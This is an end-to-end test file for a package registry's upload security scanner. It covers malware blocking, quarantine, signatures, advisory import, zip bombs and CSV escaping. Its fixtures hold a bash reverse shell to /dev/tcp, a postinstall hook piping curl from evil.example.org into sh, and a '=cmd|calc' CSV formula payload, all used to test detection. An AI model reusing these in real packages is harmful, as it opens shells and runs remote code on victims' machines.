import * as crypto from 'node:crypto';
import AdmZip from 'adm-zip';
import request from 'supertest';
import { ADMIN, DEVELOPER, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball } from './fixtures';
import { csvCell } from '../src/security/security.service';

const REVERSE_SHELL = `const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');\n`;

function publish(
  ctx: TestContext,
  name: string,
  version: string,
  tarball: Buffer,
  signature?: string,
) {
  const body: Record<string, unknown> = {
    _id: name,
    name,
    'dist-tags': { latest: version },
    versions: { [version]: { name, version, dist: {} } },
    _attachments: {
      [`${name}-${version}.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
    },
  };
  if (signature) body.signature = signature;
  // npm 路由的 Basic 只认 API Token（与真实 npm CLI always-auth 行为一致）
  return request(ctx.baseUrl)
    .put(`/npm/${name}`)
    .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
    .send(body);
}

function publishAs(
  ctx: TestContext,
  user: { username: string; password: string },
  name: string,
  version: string,
  tarball: Buffer,
) {
  return request(ctx.baseUrl)
    .put(`/npm/${name}`)
    .auth(user.username, ctx.npmTokens[user.username])
    .send({
      _id: name,
      name,
      'dist-tags': { latest: version },
      versions: { [version]: { name, version, dist: {} } },
      _attachments: {
        [`${name}-${version}.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
      },
    });
}

describe('上传包安全校验（e2e）', () => {
  let ctx: TestContext;
  let privateKey: crypto.KeyObject;

  beforeAll(async () => {
    // 可信公钥必须在应用启动前注入，配置在首次读取时会缓存
    const pair = crypto.generateKeyPairSync('ed25519');
    privateKey = pair.privateKey;
    process.env.SECURITY_TRUSTED_KEYS = JSON.stringify([
      { keyId: 'e2e', pem: pair.publicKey.export({ type: 'spki', format: 'pem' }).toString() },
    ]);
    ctx = await createTestApp('security');
  });

  afterAll(async () => {
    await ctx.close();
  });

  it('恶意代码命中 critical 时拒绝入库并返回 SEC_BLOCKED', async () => {
    const tarball = await makeNpmTarball('e2e-sec-mal', '1.0.0', {}, { 'index.js': REVERSE_SHELL });
    const res = await publish(ctx, 'e2e-sec-mal', '1.0.0', tarball).expect(403);
    expect(res.body.error).toBe('SEC_BLOCKED');
    expect(res.body.scanId).toBeTruthy();

    // 被拦截的包不得出现在包列表中
    const list = await request(ctx.baseUrl)
      .get('/api/v1/packages')
      .query({ q: 'e2e-sec-mal' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(list.body.data.total).toBe(0);

    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-sec-mal' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(scans.body.data.items[0].disposition).toBe('BLOCK');
    expect(scans.body.data.items[0].verdict).toBe('critical');

    // 错误体透出可执行的整改信息，且证据必须脱敏
    expect(Array.isArray(res.body.findings)).toBe(true);
    expect(res.body.findings[0].ruleId).toBeTruthy();
    expect(res.body.remediation).toBeTruthy();

    const detail = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scans.body.data.items[0].id}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const malware = detail.body.data.findings.find((item: { ruleId: string }) => item.ruleId === 'MAL-001');
    expect(malware.evidence).toContain('***');
    expect(malware.evidence).not.toContain('10.0.0.1');
  });

  it('高危安装脚本进入隔离区，复核放行后才可下载', async () => {
    const tarball = await makeNpmTarball(
      'e2e-sec-quarantine',
      '1.0.0',
      { scripts: { postinstall: 'curl http://evil.example.org/install.sh | sh' } },
      { 'index.js': 'module.exports = 1;\n' },
    );

    const res = await publish(ctx, 'e2e-sec-quarantine', '1.0.0', tarball).expect(409);
    expect(res.body.error).toBe('SEC_QUARANTINED');

    const quarantine = await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const record = quarantine.body.data.items.find(
      (item: { name: string }) => item.name === 'e2e-sec-quarantine',
    );
    expect(record).toBeTruthy();
    expect(record.verdict).toBe('high');

    // 隔离期间包不可见
    const before = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name: 'e2e-sec-quarantine' })
      .auth(ADMIN.username, ADMIN.password);
    expect(before.status).toBe(404);

    await request(ctx.baseUrl)
      .post(`/api/v1/security/quarantine/${record.id}/release`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);

    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name: 'e2e-sec-quarantine' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.versions).toHaveLength(1);
    expect(detail.body.data.versions[0].version).toBe('1.0.0');
  });

  it('中危敏感信息入库告警，报告可导出 JSON 与 CSV', async () => {
    const tarball = await makeNpmTarball(
      'e2e-sec-warn',
      '1.0.0',
      {},
      { 'index.js': `const token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop';\nmodule.exports = token;\n` },
    );

    await publish(ctx, 'e2e-sec-warn', '1.0.0', tarball).expect(201);

    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-sec-warn' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const scan = scans.body.data.items[0];
    expect(scan.disposition).toBe('WARN');
    expect(scan.signatureStatus).toBe('unsigned');
    expect(scan.dimensions.integrity.summary).toContain('SKIPPED');

    const detail = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scan.id}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(
      detail.body.data.findings.some((item: { ruleId: string }) => item.ruleId === 'SEC-007'),
    ).toBe(true);

    const json = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scan.id}/report`)
      .query({ format: 'json' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(json.headers['content-type']).toContain('application/json');
    expect(json.text).toContain('SEC-007');

    const csv = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scan.id}/report`)
      .query({ format: 'csv' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(csv.headers['content-type']).toContain('text/csv');
    expect(csv.text.charCodeAt(0)).toBe(0xfeff);
    expect(csv.text.split('\n')[0]).toContain('dimension');
    expect(csv.text).toContain('SEC-007');
  });

  it('CSV 单元格对公式前缀做转义，避免 Excel 执行包内内容', () => {
    expect(csvCell('=cmd|calc')).toBe("'=cmd|calc");
    expect(csvCell('+1')).toBe("'+1");
    expect(csvCell('-2')).toBe("'-2");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('a"b')).toBe('"a""b"');
    expect(csvCell('正常文本')).toBe('正常文本');
  });

  it('有效签名通过校验，伪造签名被拦截', async () => {
    const tarball = await makeNpmTarball('e2e-sec-signed', '1.0.0');
    const signature = crypto.sign(null, tarball, privateKey).toString('base64');
    await publish(ctx, 'e2e-sec-signed', '1.0.0', tarball, signature).expect(201);

    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-sec-signed' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(scans.body.data.items[0].signatureStatus).toBe('verified');

    const forged = await makeNpmTarball('e2e-sec-forged', '1.0.0');
    const res = await publish(ctx, 'e2e-sec-forged', '1.0.0', forged, 'AAAA').expect(403);
    expect(res.body.error).toBe('SEC_BLOCKED');
  });

  it('漏洞库导入后按版本命中，复检可将存量版本隔离并放行', async () => {
    // 先在空漏洞库下上传，确保初始状态为 ALLOW
    const tarball = await makeNpmTarball('e2e-sec-rescan', '1.0.0');
    await publish(ctx, 'e2e-sec-rescan', '1.0.0', tarball).expect(201);

    const importRes = await request(ctx.baseUrl)
      .post('/api/v1/security/advisories/import')
      .auth(ADMIN.username, ADMIN.password)
      .send({
        advisories: [
          {
            source: 'CVE',
            advisoryId: 'CVE-2099-0001',
            ecosystem: 'npm',
            packageName: 'e2e-sec-rescan',
            affectedRange: '<2.0.0',
            severity: 'high',
            cvss: 8.1,
            title: '复检用例漏洞',
            fixedVersion: '2.0.0',
          },
          {
            source: 'CNVD',
            advisoryId: 'CNVD-2099-0002',
            ecosystem: 'npm',
            packageName: 'e2e-sec-vuln',
            affectedRange: '>=1.0.0 <2.0.0',
            severity: 'medium',
            title: '中危依赖漏洞',
          },
        ],
      })
      .expect(201);
    expect(importRes.body.data.imported).toBe(2);

    // 新上传的包命中中危漏洞：允许入库但留下风险项
    const vulnTarball = await makeNpmTarball('e2e-sec-vuln', '1.0.0');
    await publish(ctx, 'e2e-sec-vuln', '1.0.0', vulnTarball).expect(201);
    const vulnScans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-sec-vuln' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(vulnScans.body.data.items[0].disposition).toBe('WARN');
    expect(vulnScans.body.data.items[0].dimensions.vulnerability.findingCount).toBeGreaterThan(0);

    // 手动复检：存量版本被高危漏洞命中后自动隔离
    const rescan = await request(ctx.baseUrl)
      .post('/api/v1/security/rescan')
      .auth(ADMIN.username, ADMIN.password)
      .send({})
      .expect(201);
    expect(rescan.body.data.scanned).toBeGreaterThanOrEqual(3);
    expect(rescan.body.data.quarantined).toBeGreaterThanOrEqual(1);

    const beforeRelease = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name: 'e2e-sec-rescan' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(beforeRelease.body.data.versions).toHaveLength(0);

    const quarantine = await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const record = quarantine.body.data.items.find(
      (item: { name: string; trigger: string }) =>
        item.name === 'e2e-sec-rescan' && item.trigger === 'rescan',
    );
    expect(record).toBeTruthy();

    await request(ctx.baseUrl)
      .post(`/api/v1/security/quarantine/${record.id}/release`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);

    const afterRelease = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name: 'e2e-sec-rescan' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(afterRelease.body.data.versions).toHaveLength(1);
    expect(afterRelease.body.data.versions[0].status).toBe('active');
  });

  it('导入必须显式声明 ecosystem，跨生态条目对两个生态同时生效', async () => {
    const res = await request(ctx.baseUrl)
      .post('/api/v1/security/advisories/import')
      .auth(ADMIN.username, ADMIN.password)
      .send({
        advisories: [
          // 缺 ecosystem：早期实现会静默折叠成 '*'，跨生态误伤，现在必须拒绝
          {
            source: 'CVE',
            advisoryId: 'CVE-2099-0200',
            packageName: 'no-eco-pkg',
            affectedRange: '<1.0.0',
            severity: 'low',
          },
          // 不认识的家族同样拒绝，不能当成通配
          {
            source: 'CVE',
            advisoryId: 'CVE-2099-0201',
            ecosystem: 'rubygems',
            packageName: 'bad-eco-pkg',
            affectedRange: '<1.0.0',
            severity: 'low',
          },
          {
            source: 'CVE',
            advisoryId: 'CVE-2099-0202',
            ecosystem: '*',
            packageName: 'shared-name',
            affectedRange: '<2.0.0',
            severity: 'medium',
            title: '跨生态条目',
          },
          {
            source: 'CVE',
            advisoryId: 'CVE-2099-0203',
            ecosystem: 'npm',
            packageName: 'npm-only-pkg',
            affectedRange: '<2.0.0',
            severity: 'low',
          },
        ],
      })
      .expect(201);

    expect(res.body.data.imported).toBe(2);
    expect(res.body.data.skipped).toBe(2);
    expect(String(res.body.data.errors.join(' '))).toContain('ecosystem');
    expect(String(res.body.data.errors.join(' '))).toContain('CVE-2099-0200');

    // pypi 视角：只应看到跨生态那条，看不到 npm 专属条目
    const forPypi = await request(ctx.baseUrl)
      .get('/api/v1/security/advisories')
      .query({ ecosystem: 'pypi', q: '2099-02', pageSize: 50 })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const pypiIds = (forPypi.body.data.items as { advisory_id: string }[]).map((item) => item.advisory_id);
    expect(pypiIds).toContain('CVE-2099-0202');
    expect(pypiIds).not.toContain('CVE-2099-0203');

    // ecosystem='*' 走精确过滤，只返回跨生态条目
    const wildcardOnly = await request(ctx.baseUrl)
      .get('/api/v1/security/advisories')
      .query({ ecosystem: '*', q: '2099-02', pageSize: 50 })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const wildcardIds = (wildcardOnly.body.data.items as { advisory_id: string }[]).map((item) => item.advisory_id);
    expect(wildcardIds).toEqual(['CVE-2099-0202']);

    // 跨生态条目对 npm 包同样命中：证明 '*' 在匹配路径上生效，而不只是查询过滤
    const tarball = await makeNpmTarball('shared-name', '1.0.0');
    await publish(ctx, 'shared-name', '1.0.0', tarball).expect(201);
    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'shared-name' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(scans.body.data.items[0].dimensions.vulnerability.findingCount).toBeGreaterThan(0);

    // 概览按生态拆分：能看出 pypi 侧一条数据都没有
    const overview = await request(ctx.baseUrl)
      .get('/api/v1/security/overview')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const byEco = overview.body.data.advisoriesByEcosystem;
    expect(byEco.wildcard).toBe(1);
    expect(byEco.pypi).toBe(0);
    expect(byEco.npm).toBeGreaterThanOrEqual(1);
    expect(overview.body.data.advisories).toBe(byEco.npm + byEco.pypi + byEco.wildcard);
  });

  it('嵌套归档内的恶意代码会被递归扫描并拦截', async () => {
    const inner = new AdmZip();
    inner.addFile('evil.js', Buffer.from(REVERSE_SHELL));
    const tarball = await makeNpmTarball('e2e-nested', '1.0.0', {}, {
      'index.js': 'module.exports = 1;\n',
      'payload.zip': inner.toBuffer(),
    });

    const res = await publish(ctx, 'e2e-nested', '1.0.0', tarball).expect(403);
    expect(res.body.error).toBe('SEC_BLOCKED');

    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-nested' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const detail = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scans.body.data.items[0].id}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const hit = detail.body.data.findings.find((item: { ruleId: string }) => item.ruleId === 'MAL-001');
    expect(hit.location).toContain('payload.zip!/');
  });

  it('超高压缩比条目按压缩炸弹拒绝', async () => {
    const bomb = new AdmZip();
    // 2MB 全零数据压缩后仅约 2KB，压缩比远超阈值
    bomb.addFile('zeros.bin', Buffer.alloc(2 * 1024 * 1024));
    const tarball = await makeNpmTarball('e2e-bomb', '1.0.0', {}, {
      'index.js': 'module.exports = 1;\n',
      'payload.zip': bomb.toBuffer(),
    });

    const res = await publish(ctx, 'e2e-bomb', '1.0.0', tarball).expect(403);
    expect(res.body.error).toBe('SEC_BLOCKED');

    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-bomb' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const detail = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${scans.body.data.items[0].id}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.findings.some((item: { ruleId: string }) => item.ruleId === 'INT-011')).toBe(true);
    // 报告需能复现判定依据：规则包版本 + 漏洞库快照
    expect(detail.body.data.ruleVersion).toBe('2026.11.1');
    expect(detail.body.data.advisorySnapshotId).toBeTruthy();
    const report = await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${detail.body.data.id}/report`)
      .query({ format: 'json' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const parsed = JSON.parse(report.text);
    expect(parsed.ruleVersion).toBe('2026.11.1');
    expect(parsed.advisorySnapshotId).toBe(detail.body.data.advisorySnapshotId);
    expect(parsed.sbom.bomFormat).toBe('CycloneDX');
  });

  it('开发者只能查看自己包的安全结论，管理接口仍仅限管理员', async () => {
    const tarball = await makeNpmTarball('e2e-sec-own', '1.0.0');
    await publishAs(ctx, DEVELOPER, 'e2e-sec-own', '1.0.0', tarball).expect(201);

    const own = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(own.body.data.items.every((item: { name: string }) => item.name === 'e2e-sec-own')).toBe(true);

    // 他人上传的扫描记录不可见
    const adminScan = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name: 'e2e-sec-mal' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    await request(ctx.baseUrl)
      .get(`/api/v1/security/scans/${adminScan.body.data.items[0].id}`)
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(403);

    await request(ctx.baseUrl)
      .get('/api/v1/security/overview')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(403);
    await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(403);
  });

  it('packument、下载响应与校验接口都能消费安全结论', async () => {
    const packument = await request(ctx.baseUrl)
      .get('/npm/e2e-sec-own')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(packument.body.versions['1.0.0'].security.status).toBeTruthy();
    expect(packument.body.versions['1.0.0'].security.scanId).toBeTruthy();

    const download = await request(ctx.baseUrl)
      .get('/npm/e2e-sec-own/-/e2e-sec-own-1.0.0.tgz')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(download.headers['x-package-security']).toBeTruthy();

    const attestation = await request(ctx.baseUrl)
      .get('/api/v1/security/attestations')
      .query({ ecosystem: 'npm', name: 'e2e-sec-own', version: '1.0.0' })
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(attestation.body.data.scanId).toBe(packument.body.versions['1.0.0'].security.scanId);
    expect(typeof attestation.body.data.passed).toBe('boolean');
  });

  it('畸形归档按失败阻断且不影响后续请求', async () => {
    const garbage = crypto.randomBytes(4096);
    const res = await publishAs(ctx, DEVELOPER, 'e2e-bad-archive', '1.0.0', garbage);
    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.status).toBeLessThan(500);

    await request(ctx.baseUrl)
      .get('/npm/e2e-bad-archive')
      .auth(ADMIN.username, ADMIN.password)
      .expect(404);
    await request(ctx.baseUrl)
      .get('/api/v1/security/metrics')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
  });

  it('提供运行指标与孤儿资源巡检能力', async () => {
    const metrics = await request(ctx.baseUrl)
      .get('/api/v1/security/metrics')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(metrics.body.data.scans).toBeGreaterThan(0);
    expect(metrics.body.data.durationMs).toHaveProperty('p95');
    expect(metrics.body.data.queue).toHaveProperty('active');

    const sweep = await request(ctx.baseUrl)
      .post('/api/v1/security/maintenance/orphans')
      .auth(ADMIN.username, ADMIN.password)
      .send({ apply: false })
      .expect(201);
    expect(sweep.body.data.applied).toBe(false);
    expect(sweep.body.data.orphanObjects).toHaveProperty('count');
  });
});
